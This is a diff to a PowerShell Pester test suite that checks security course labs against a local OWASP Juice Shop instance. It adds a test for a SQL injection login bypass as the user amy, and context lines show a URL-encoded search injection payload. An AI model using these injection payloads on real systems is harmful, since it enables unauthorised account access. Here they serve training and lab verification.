@@ -611,7 +611,7 @@ Describe '507 Labs'{
     }
   }
 
-  Context 'Lab5.3'{
+  Context 'Lab5.3' {
     It 'Part 1 - SQL injection returns all rows' {
       # '));
       $uri = 'http://juiceshop.5x7.local/rest/products/search?q=%27%29%29%3B'
@@ -666,6 +666,22 @@ Describe '507 Labs'{
         Should -BeGreaterOrEqual 1
       ($res.Content | ConvertFrom-Json).authentication.umail | 
         Should -BeExactly 'jim@juice-sh.op'
+    }
+  }
+
+  Context 'Lab5.4' {
+    #Skip part 1 since it uses DOM
+
+    It 'Part 2 - Amy login with SQL injection works' {
+      $uri='http://juiceshop.5x7.local/rest/user/login'
+      $body='{"email":"amy@juice-sh.op'';--","password":"PESTER-DOESNT-MATTER"}'
+      $res = Invoke-WebRequest -Method Post -Body $body -Uri $uri -ContentType 'application/json'
+
+      $res.StatusCode | Should -BeExactly 200
+      ($res.Content | ConvertFrom-Json).authentication.token.Length |
+        Should -BeGreaterOrEqual 1
+      ($res.Content | ConvertFrom-Json).authentication.umail | 
+        Should -BeExactly 'amy@juice-sh.op'
     }
   }
 }
